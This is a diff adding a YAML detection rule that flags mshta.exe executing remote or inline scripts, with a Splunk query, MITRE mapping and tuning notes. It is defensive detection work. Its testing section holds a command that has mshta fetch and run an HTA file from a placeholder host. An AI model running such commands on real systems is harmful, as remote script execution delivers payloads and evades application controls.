@@ -1,1 +1,28 @@
 id: DET-013
+name: mshta.exe Remote Script Execution
+description: >
+  Detects mshta.exe being used to execute remote scripts via HTTP or
+  inline VBScript/JavaScript, a common technique for bypassing application
+  whitelisting and delivering malicious payloads.
+mitre_attack:
+  tactic: Defense Evasion
+  technique_id: T1218.005
+  technique_name: "System Binary Proxy Execution: Mshta"
+data_sources:
+  - index: sysmon
+    eventcode: 1
+    sourcetype: XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+splunk_query: |
+  index=sysmon EventCode=1 Image="*\\mshta.exe"
+  | where match(CommandLine, "(?i)(http|vbscript:|javascript:|\.hta)")
+  | stats count by Computer, User, CommandLine, ParentImage
+false_positives:
+  - Legitimate HTA applications used by enterprise software
+tuning_notes: >
+  Allowlist known-good HTA file paths used by legitimate software.
+  Flag any mshta.exe connecting to external URLs as high priority.
+testing:
+  command: "mshta.exe http://test.com/test.hta"
+  result: DETECTED
+  fp_rate: Low
+status: production
